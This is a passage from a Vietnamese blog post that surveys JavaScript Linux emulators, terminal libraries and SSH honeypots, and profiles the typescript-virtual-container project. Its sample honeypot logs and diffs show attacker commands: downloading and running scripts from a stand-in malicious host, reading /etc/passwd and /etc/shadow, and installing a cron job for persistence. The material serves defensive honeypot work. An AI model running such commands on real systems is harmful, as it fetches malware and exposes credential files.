| **Kiến trúc** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (độc quyền) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Nhân thật** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Gói npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (công cụ CLI) |
| **Dùng Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (chỉ trình duyệt) | qua Wasmtime |
| **Dùng trình duyệt** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instance** | 150-256 Mo | ~64-128 Mo | ~64 Mo | 200+ Mo | ~100 Mo | ~200-500 Mo |
| **Thời gian khởi động** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | một phần | ✅ |
| **Trạng thái** | ✅ rất hoạt động | ✅ ổn định | ⚠️ lưu trữ | ✅ thương mại | ✅ hoạt động | ✅ hoạt động |

Điều đập vào mắt trong bảng này : `v86` là duy nhất vừa là gói npm, vừa chạy cả trong trình duyệt và Node, vừa open-source. Đó là lý do nó thống trị cuộc trò chuyện về "trình giả lập Linux bằng JavaScript". Mọi thứ còn lại đều có điểm trừ -- JSLinux không có API, jor1k đã lưu trữ, CheerpX tốn tiền, WebContainers chỉ trình duyệt và riêng Node, container2wasm đòi bước build và CLI. Nếu bạn chỉ cần "khởi động Linux bằng JavaScript", `v86` gần như luôn là điểm khởi đầu đúng.

## Phần 3 -- Stack terminal : xterm.js và node-pty

Hai gói cứ xuất hiện mỗi khi người ta xây trải nghiệm kiểu shell. Chúng không phải sandbox hay trình giả lập -- mà là ống nối UI và PTY -- nhưng chúng liên quan tới mức tôi sẽ thấy áy náy nếu bỏ qua. Ngoài ra, tôi đã dùng cả hai và chúng thực sự tốt.

### 3.1 `xterm.js` -- render terminal

xterm.js là trình giả lập terminal cho trình duyệt. Nó hiển thị màn hình terminal (chuỗi thoát VT100/xterm) trong phần tử `<canvas>`, xử lý đầu vào bàn phím, và phơi bày API để định tuyến dữ liệu.

Được dùng bởi : terminal tích hợp của VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, và nhiều nữa.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Gửi dữ liệu tới terminal (hiển thị như văn bản)
term.write("$ ");
term.onData(data => {
  // data là phím gõ -- gửi tới backend của bạn
  socket.send(data);
});
socket.onmessage(msg => {
  // đầu ra backend -- hiển thị nó
  term.write(msg.data);
});
```

xterm.js chỉ là lớp render. Nó không chạy shell. Nó không thông dịch lệnh. Đó là widget hiển thị bạn nối tới backend tùy chọn. Nhiều người tưởng xterm.js "làm terminal" nhưng thực chất nó chỉ là màn hình -- bạn vẫn phải nối nó tới thứ thực sự chạy lệnh.

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- tạo PTY

`node-pty` tạo pseudoterminal (PTY) trong Node.js và đưa bạn handle đọc/ghi lên nó. Dùng cùng xterm.js, nó cho phép xây terminal trình duyệt nói chuyện với shell thật (bash, zsh, fish) chạy trên máy chủ.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Gửi tới xterm.js trình duyệt qua WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Chuyển phím gõ trình duyệt tới shell
  shell.write(data);
});
```

Đó là sơ đồ chuẩn cho IDE đám mây và terminal web : xterm.js (trình duyệt) ↔ WebSocket ↔ node-pty ↔ bash thật. Cách ly vẫn không tồn tại. Shell chạy với mọi quyền của tiến trình Node.js (hay người dùng chạy nó).

**Duy trì bởi** : Microsoft.
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Phần 4 -- Honeypot SSH

Honeypot thiết kế để bị tấn công. Mục tiêu là trông đủ thật để kẻ tấn công tương tác, đồng thời ghi mọi thứ chúng làm cho tình báo mối đe dọa. SSH là mục tiêu chính vì đó là dịch vụ bị tấn công nhiều nhất trên internet -- nếu bạn phơi cổng 22 trên IP công cộng, bạn sẽ thấy mưu toan quét tự động trong vài phút theo nghĩa đen. Thử một ngày xem, tốc độ tới rợn người.

Chất lượng honeypot đo bằng hai thứ : **độ trung thực** (bắt chước hệ thống thật thuyết phục tới đâu) và **đo xa** (thu bao nhiêu dữ liệu hữu ích). Hai thứ này giằng nhau. Honeypot độ trung thực cao khó xây hơn và rủi ro hơn khi vận hành.

Mục này là thứ cuối cùng dẫn tôi tới việc xây module `HoneyPot` trong `typescript-virtual-container`, nên tôi có vài ý kiến ở đây.

### 4.1 Cowrie -- chuẩn vàng

Cowrie là honeypot SSH và Telnet tương tác trung bình tới cao dựa trên Python. Đó là honeypot SSH triển khai nhiều nhất trong cộng đồng nghiên cứu và bảo mật.

Kiến trúc :
- **Lớp giao thức** : triển khai giao thức SSH thật (Twisted Conch), nên kẻ tấn công có bắt tay thật, trao đổi khóa thật, xác thực thật
- **Lớp shell** : hệ thống tệp giả (trông như Debian 5.0) và trình thông dịch shell một phần trả lời các lệnh phổ biến
- **Chế độ proxy** : có thể chuyển hướng tới hệ thống thật đằng sau (chế độ tương tác cao), ghi mọi thứ đi qua
- **Chế độ LLM** (thêm gần đây) : dùng mô hình ngôn ngữ để sinh phản hồi động cho lệnh nó không xử lý được -- đúng, Cowrie giờ có chế độ AI. Ta đang sống trong thời điên rồ.

```python
# Những gì Cowrie thu
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie lưu tệp được tải (qua wget/curl/SFTP/SCP) để phân tích malware. Nó tích hợp với Splunk, Elasticsearch, và nền tảng SIEM khác.

**Độ trung thực** : trung bình-cao. Đủ thuyết phục để lừa bot tự động (chiếm 99% kẻ tấn công SSH -- đa số chỉ là script ngu thử `root`/`password`). Con người tinh vi có thể nhận diện bằng vân tay số, thường khá nhanh.

**Ngôn ngữ** : Python (Twisted)
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- tiền thân của Cowrie

Kippo là honeypot SSH tương tác trung bình gốc mà Cowrie dựa trên. Cùng ý tưởng cơ bản : giao thức SSH thật, hệ thống tệp giả, shell một phần. Cowrie đã hoàn toàn thay thế nó tới nay -- Kippo đã lưu trữ và không ai nên dùng năm 2026. Nhắc ở đây thuần cho đầy đủ lịch sử, vì bạn có thể thấy nó được dẫn trong bài blog cũ và giấy bảo mật.

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo) -- đã lưu trữ

---

### 4.3 endlessh -- hố tarpit SSH

endlessh là honeypot suy biến : nó giữ kết nối SSH mở bằng cách phát chậm dữ liệu banner 1 byte mỗi giây (hay ít hơn). Client SSH nào nối tới sẽ kẹt vô thời hạn -- không bao giờ tới xác thực vì máy chủ không bao giờ gửi xong banner.

Mục tiêu không phải tình báo mối đe dọa mà là từ chối tài nguyên thuần túy : chiếm luồng quét của kẻ tấn công để chúng không chạm tới mục tiêu thật nhanh được. Thật lòng hơi ác theo nghĩa tốt. Bạn không học gì từ kẻ tấn công -- bạn chỉ phí thời gian của nó. Có điều gì đó thỏa mãn sâu sắc ở đó.

```c
// Toàn bộ hành vi giao thức của endlessh :
// Gửi : "SSH-2.0-OpenSSH_" rồi chậm rãi thêm ký tự ngẫu nhiên
// Không bao giờ đóng kết nối
// Máy quét của kẻ tấn công hết hạn sau N giây
```

Không lệnh nào bị thu. Không xác thực nào bị thử. Chỉ thời gian kết nối.

**Viết bằng** : C
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- honeypot "cho mọi người vào"

sshesame chấp nhận mọi kết nối SSH (bất kỳ người dùng, bất kỳ mật khẩu, bất kỳ khóa nào) và ghi mọi thứ. Đó là honeypot không tương tác : nó không trả lời lệnh, chỉ để kẻ tấn công "vào" và ghi từng phím chúng gõ.

```
2024-01-15 03:22:11 Kết nối từ 45.33.32.156
  Người dùng : root, Mật khẩu : password123 -- chấp nhận
  Lệnh đã gõ :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Ngắt sau 47s
```

Hữu ích cho thu hoạch credential : bạn nhanh chóng tích lũy tên người dùng và mật khẩu bot thử, cho biết credential mặc định nào đang bị bruteforce tích cực. Tiết lộ : luôn là `root`/`password`, `admin`/`admin`, và `root`/`123456`. Lần nào cũng vậy.

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework honeypot dựa trên Docker

`lyrebird/honeypot-base` là ảnh cơ sở Docker để xây honeypot dịch vụ mạng. Nó không riêng honeypot SSH -- mà là framework để xây honeypot cho bất kỳ giao thức nào.

Ảnh cơ sở cung cấp framework ghi log, hệ thống plugin cho giao thức, và cấu hình Docker Compose cho honeypot đa dịch vụ. Bạn mở rộng nó để mô phỏng dịch vụ cụ thể.

**Docker Hub** : [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Xây honeypot SSH bằng Node.js -- cách ngây thơ, và vì sao nó thất bại

Trước `typescript-virtual-container`, xây honeypot SSH bằng Node.js nghĩa là kết hợp thư viện `ssh2` thật với mô phỏng lệnh thủ công. Rất cực, rất thiếu, nhưng... tới đây là đoạn bắt buộc :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Ghi lại mưu toan
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Cho mọi người vào
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Phản hồi mô phỏng
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Việc này "chạy" theo nghĩa thu credential và lệnh. Nhưng nó lộ giả rõ ràng hễ kẻ tấn công tinh vi đào sâu. `uname -a` trả chuỗi đúng nhưng `ls /etc` trả "command not found" -- mùi bẫy nồng nặc. Hệ thống tệp không tồn tại. Lệnh không nối nhau. Pipe không chạy. Biến không giãn.

Kẻ tấn công thạo sẽ nhận ra honeypot của bạn trong năm lệnh đầu tiên. Script tự động tìm hành vi kiểu Cowrie cũng phát hiện ngay. Rõ ràng đó là thứ thúc tác giả `typescript-virtual-container` xây thứ thực sự thông dịch lệnh cho thật -- thêm về đó trong Phần 5.

---

### Tóm tắt họ honeypot

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Ngây thơ ssh2 |
|---|---|---|---|---|---|---|
| **Mức tương tác** | trung bình-cao | trung bình | không | không | thay đổi | thấp |
| **Giao thức SSH thật** | ✅ | ✅ | ❌ (tarpit) | ✅ | thay đổi | ✅ |
| **Độ trung thực shell** | trung bình | trung bình | n/a | không có | thay đổi | tối thiểu |
| **Thu credential** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Thu lệnh** | ✅ | ✅ | ❌ | ✅ | thay đổi | ✅ |
| **Thu malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Tích hợp SIEM** | ✅ gốc | ❌ | ❌ | ❌ | ❌ | thủ công |
| **Phản hồi LLM** | ✅ (mới) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Ngôn ngữ** | Python | Python | C | Go | Docker | Node.js |
| **Node.js gốc** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Trạng thái** | ✅ rất hoạt động | ⚠️ lưu trữ | ✅ hoạt động | ✅ hoạt động | ✅ hoạt động | tự làm |

Mô hình ở đây khá rõ : càng muốn trung thực, càng phải viết nhiều Python. Cowrie là quán quân không tranh cãi nếu bạn làm nghiêm túc -- nó đã tôi luyện thực địa nhiều năm và thu nhiều hơn credential đơn thuần. endlessh và sshesame là dự án vui hơn là công cụ tình báo mối đe dọa nghiêm túc. Và cách ngây thơ bằng Node.js đưa bạn tới 20% đường trước khi đụng tường.

## Phần 5 -- `typescript-virtual-container` : thứ lấp khoảng trống

OK tới đây mọi thứ thành thú vị. Sau khi lập danh mục mọi họ trên, góc phần tư còn thiếu trở nên khá rõ :

- Sandbox JS : cách ly mã, không shell, không hệ thống tệp, không SSH
- Trình giả lập Linux : OS thật, shell thật, SSH thật... nhưng 150+ Mo RAM, 30 giây khởi động, và bạn phải tự xây API trên I/O serial
- Honeypot : shell giả, không API lập trình được, Python/Go/C, không gốc Node

Chưa ai xây môi trường Linux đầy đủ, lập trình được, gốc Node, với SSH thật, quyền thật, mạng ảo thật, và API TypeScript có kiểu. Nên cô ấy đã xây.

Giới thiệu ngắn vì đây là lần đầu tôi nhắc cô ấy đàng hoàng : `typescript-virtual-container` do [Chloé Rolzhausen](https://itsrealfortune.fr) xây, một lập trình viên Pháp lấy tên **Fortune** (hay ItsRealFortune) trên mạng. Bạn có thể tìm cô ấy trên [trang web](https://itsrealfortune.fr) và [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Toàn bộ dự án -- 56 000 dòng TypeScript, 247 tệp, 170 lệnh -- là nỗ lực solo của một người. Phần còn lại của bài tôi sẽ gọi cô ấy là Fortune. Và đúng, khá điên. Ghé xem việc của cô ấy đi!

### Nó thực sự là gì

`typescript-virtual-container` là **trình mô phỏng môi trường Linux** viết bằng TypeScript thuần. Không Wasm, không extension gốc, không nhân. ~56 000 dòng mã nguồn trên 247 tệp TypeScript.

Thấu suốt mấu chốt : bạn không cần trình giả lập CPU để chạy `ls /etc | grep passwd`. Bạn cần :
1. Cây node trong bộ nhớ đáp ứng thao tác đường dẫn
2. Mô hình quyền POSIX áp cho mỗi truy cập
3. Trình phân tích cú pháp shell hiểu pipeline, chuyển hướng, subshell và giãn biến
4. ~170 triển khai lệnh (hàm, không phải nhị phân)
5. Hệ thống quản lý người dùng và nhóm
6. Thứ gì đó phơi bày tất cả qua SSH

Tất cả khả thi bằng TypeScript thuần mà không dính dáng nhân nào.

### VirtualFileSystem

VFS là cây trong bộ nhớ các node có kiểu -- không I/O đĩa trừ khi bạn bật rõ chế độ bền vững `"fs"` :

```ts
// Biểu diễn nội bộ rút gọn
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // chỗ giữ tải lười
```

Mỗi thao tác đường dẫn đi qua `normalizePath` (giải `.`, `..`, liên kết tượng trưng) và `enforceAccess` (kiểm tra quyền đọc/ghi/thực thi với uid/gid yêu cầu). `chmod`, `chown`, sticky bit và setuid đều triển khai và áp thật. Nếu tiến trình chạy dưới uid 1000 cố đọc tệp của root với mode 0600, nó nhận EACCES -- không phải EACCES giả, mà là `Error` JavaScript thật ném từ bước kiểm tra quyền. Phần này khá thanh lịch thật lòng.

VFS tuần tự hóa thành :
- `.vfsb` -- định dạng nhị phân gọn (tùy chỉnh, nén fflate) -- đây là định dạng mặc định
- Snapshot JSON -- con người đọc được, tốt cho gỡ lỗi
- Lưu trữ TAR -- nhập/xuất với định dạng tar thật, nên bạn có thể `tar -xf` thứ gì đó và VFS chỉ... có các tệp đó
- Ảnh SquashFS -- nhập chỉ đọc

Trong chế độ bền vững `"fs"`, nó duy trì nhật ký ghi trước (WAL) để phục hồi sau crash -- ghi đi vào nhật ký trước, rồi vào snapshot khi flush. Nếu Node sập giữa thao tác, nhật ký cho phép bạn dựng lại trạng thái đầy đủ cuối cùng.

Ngoài ra có lớp `FileCache` mô phỏng độ trễ I/O đĩa. Bạn cấu hình profile như `NVME_DISK_IO` hay `HDD_DISK_IO` và VFS trì hoãn nhân tạo thao tác tệp để khớp thời gian thực tế. Khá buồn cười -- phần mềm cố tình chậm lại để mô phỏng phần cứng -- nhưng thực ra rất hữu ích cho benchmark.

### Trình thông dịch shell

Trình phân tích cú pháp shell sinh AST có kiểu :

```ts
// "ls /etc | grep root && echo done" phân tích thành :
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Bộ thực thi duyệt AST này :
- Với pipeline, nó tạo chuỗi luồng `{ stdin, stdout, stderr }` và chạy mỗi lệnh với I/O nối ống
- Với toán tử logic (`&&`, `||`), nó kiểm tra `$?` sau vế trái trước khi chạy vế phải
- Với subshell (`$(...)`, `` ` ` ``), nó rẽ nhánh ngữ cảnh thực thi
- Với chuyển hướng (`>tệp`, `>>tệp`, `2>&1`, `<tệp`), nó đấu dây luồng trước khi thực thi
- Với tác vụ nền (`cmd &`), nó chạy mà không chờ xong
- Với biến, nó giãn `$VAR`, `${VAR:-default}`, `${#VAR}`, và số học `$((expr))`
- Với giãn ngoặc (`{a,b,c}`, `{1..5}`), nó sinh danh sách giãn đầy đủ trước khi thực thi

Tất cả là hành vi shell POSIX thật. Trình phân tích xử lý heredoc, thay thế tiến trình, globbing (`*`, `?`, `[abc]`), và xử lý dấu ngoặc (ngoặc đơn, ngoặc kép kèm nội suy, thoát bằng backslash). Không hoàn hảo -- vẫn có trường hợp biên -- nhưng vượt xa những gì bạn mong từ dự án TypeScript.

### ~170 lệnh tích hợp

Lệnh là hàm TypeScript đăng ký trong sổ lệnh. Chúng nhận `CommandContext` với luồng stdin/stdout/stderr, VFS, phiên người dùng, môi trường shell, và truy cập module con.

Viết 170 triển khai lệnh Unix là... nhiều. Vài cái tầm thường (`echo`, `true`, `false`), vài cái phức tạp bất ngờ (`awk`, `find`, `tar`). Kiểu, `awk` POSIX đầy đủ? Bằng TypeScript? Điên thật. Đây là mẫu những gì trong đó :

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (phía client, kết nối ra ngoài),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (trình chỉnh tương tác đầy đủ), vim (cơ bản), vi (cơ bản),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (mô phỏng), systemctl (stub), journalctl (stub),
...và khoảng 130 cái nữa
```

Các "stub" (git, python3, node) trả lời thực tế với lời gọi phổ biến -- `python3 --version` trả chuỗi phiên bản đáng tin, `git status` hiện trạng thái repo hư cấu -- mà không làm việc thật nào. Với honeypot, chúng thực ra hữu ích hơn lệnh thật, vì chúng cho phép bạn quan sát kẻ tấn công cố chạy gì mà không chạy gì nguy hiểm.

### Máy chủ SSH

Lớp SSH dùng gói npm `ssh2` thật -- giao thức SSH thật, trao đổi khóa thật, mã hóa thật. `SSHMimic` bọc nó :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH thật : ssh -p 2222 root@localhost
// SFTP thật : sftp -P 2222 root@localhost
// SCP thật : scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` quyết định `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, và `/etc/os-release` báo cáo gì. Bạn có thể mạo danh thuyết phục bất kỳ bản phân phối Linux và phiên bản nhân nào -- với client SSH thật, đúng là không cách nào phân biệt.

### Module HoneyPot

Vì trình thông dịch shell là thật và máy chủ SSH là thật, lệnh của kẻ tấn công thực sự chạy trong môi trường ảo. Yêu cầu `wget` do kẻ tấn công kích hoạt được ghi log kèm URL đích. Tệp kẻ tấn công tạo được lưu trong VFS. Mưu toan leo thang đặc quyền của kẻ tấn công sinh lỗi thực tế.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Sau một phiên, lấy khác biệt hệ thống tệp
const before = shell.vfs.toSnapshot();
// ... phiên của kẻ tấn công ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Điều này khác về chất so với Cowrie. Hệ thống tệp giả của Cowrie có thể trả lời `ls` nhưng không thể thực sự theo dõi tệp kẻ tấn công đã tạo và sửa đổi chúng dưới dạng diff có cấu trúc. `typescript-virtual-container` làm được, vì VFS là cấu trúc dữ liệu sống -- mỗi lần ghi được theo dõi. Mục cron kẻ tấn công vừa thêm? Nó nằm trong diff. Thư mục `.hidden` đó? Trong diff. Khá hữu ích cho phân tích malware.

### Ngăn xếp mạng ảo

Đây có lẽ là phần ấn tượng nhất toàn dự án, và nó không có bản tương đương trong bất kỳ dự án nào khác ở khoảng này. Kiểu, ngăn xếp mạng ảo L2/L3 đầy đủ kèm hỗ trợ VPN, viết bằng TypeScript thuần, không card mạng thật nào dính dáng. Thực sự điên.

`VirtualNetworkManager` cho mỗi instance `VirtualShell` interface mạng ảo với địa chỉ IP cấu hình được, bảng định tuyến, và tường lửa phần mềm (quy tắc kiểu iptables với conntrack và NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` đều hiện trạng thái mạng ảo.

`VirtualSwitch` (đặt tên Baie -- từ tiếng Pháp chỉ khoang máy chủ, "baie informatique") nối nhiều shell trên cùng mạng con chia sẻ. Nó triển khai :
- Học MAC và ARP
- Định tuyến IP giữa các mạng con
- NAT (masquerade ra ngoài)
- DNS (bản ghi cấu hình được cho mỗi mạng con)
- Cân bằng tải (round-robin, ít kết nối nhất)
- Định hình lưu lượng : độ trễ, jitter (phân bố Gauss), mất gói, mất theo chùm, sắp lại thứ tự, trùng lặp
- Giới hạn băng thông (thùng token)
- Áp MTU
- Theo dõi kết nối (có trạng thái, trạng thái NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Ba máy ảo trên cùng switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Tường lửa : web chạm được api, api chạm được db, web không chạm trực tiếp được db
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Định hình lưu lượng : mô phỏng liên kết WAN chập chờn ra ngoài
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` tạo tunnel mã hóa giữa các instance Baie -- bạn có thể mô phỏng mạng đa site với liên kết VPN giữa các site.

`VirtualProxy` triển khai chuyển tiếp cổng và proxy SOCKS5.

Không gì trong số này chạm card mạng thật. Tất cả là định tuyến object TypeScript. Lệnh `ping` "chạy" bằng cách định tuyến qua switch ảo và trả phản hồi ICMP mô phỏng. `curl http://192.168.0.3/api` định tuyến qua mạng ảo, tới phản hồi HTTP mô phỏng của shell api, và trả nội dung. Rùa chồng rùa tới tận đáy, theo nghĩa tốt nhất.

### `SandboxedShell`

Cho dùng lập trình nơi bạn cần cách ly mạnh hơn, `SandboxedShell` chạy phiên shell trong luồng Worker Node.js :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% một lõi
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Cách ly ở đây do lớp VFS đảm bảo (shell luồng worker chỉ thấy hệ thống tệp ảo, không bao giờ thấy hệ thống tệp chủ) cộng cách ly bộ nhớ của luồng Worker Node.js. Nó nhẹ hơn `isolated-vm` nhưng hợp hơn cho cách ly tầng shell thay vì tầng JS.

### Trần tài nguyên

Bạn có thể cấu hình giới hạn tài nguyên cho mỗi shell ảnh hưởng tới những gì lệnh giám sát hệ thống báo cáo :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Trong shell này, `free -m` hiện tổng 512 Mo RAM. `nproc` trả 2. `/proc/meminfo` hiện giá trị trần. `htop` và `top` hiện số CPU trần. Việc này cho phép bạn định chính xác dấu chân phần cứng của máy mô phỏng.

### Ba chế độ triển khai

```
Chế độ 1 : Máy chủ SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Giao thức SSH thật, SFTP thật, SCP thật
  → Ca dùng : honeypot, môi trường test từ xa, phòng lab đào tạo

Chế độ 2 : Shell web (trình duyệt)
  builds/fortune-nyx-v1.7.8-web.min.js (bundle ESM)
  → Chạy trong trình duyệt, VFS bền vững trong IndexedDB
  → Ca dùng : hướng dẫn tương tác, terminal nhúng, demo
  → Bonus : chạy startxfce4 cho desktop XFCE mô phỏng đầy đủ

Chế độ 3 : CLI độc lập
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (một tệp duy nhất, không cài đặt)
  → curl và chạy, bền vững VFS trong thư mục .vfs/
  → Ca dùng : demo nhanh, thử nghiệm cục bộ
```

### Các polyfill -- build trình duyệt chạy thế nào không cần Wasm

OK đây là phần tôi thấy thực sự thông minh và muốn nhấn mạnh riêng.

Chạy thư viện Node.js trong trình duyệt thường là ác mộng. Hoặc bạn dùng runtime Wasm (nặng, tải chậm), hoặc bạn phí hàng tuần thay thủ công mỗi import `node:*` bằng thay thế tương thích trình duyệt. Fortune làm điều thứ hai -- nhưng rất sạch, bằng cách viết bộ polyfill tùy chỉnh sống trong thư mục `polyfills/` của repo.

Pipeline build chỉ là esbuild với đống mục `alias` :

```js
// demo/build.js -- toàn bộ config build trình duyệt
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Không Wasm, không thư viện polyfill ngoài, không nhờ `webpack-node-externals`. Chỉ module alias và vài global bơm vào. Để tôi mổ từng cái vì vài cái thực sự ấn tượng.

**`node:fs` -- IndexedDB làm hệ thống tệp giả**

Đây là món tôi thích nhất. Polyfill `node:fs` triển khai API fs đồng bộ Node.js (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) đỡ bởi hai lớp : `Map` trong bộ nhớ cho đọc đồng bộ, và IndexedDB cho bền vững qua tải lại trang. Ghi đi vào Map ngay (nên `readFileSync` ngay sau `writeFileSync` luôn chạy), rồi xả xuống IndexedDB bất đồng bộ trong nền.

```js
// Cache đồng bộ (đường dẫn → Uint8Array | null) -- đọc tức thì
const memCache = new Map();

// Tải trước mọi thứ từ IndexedDB vào memCache lúc khởi động
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
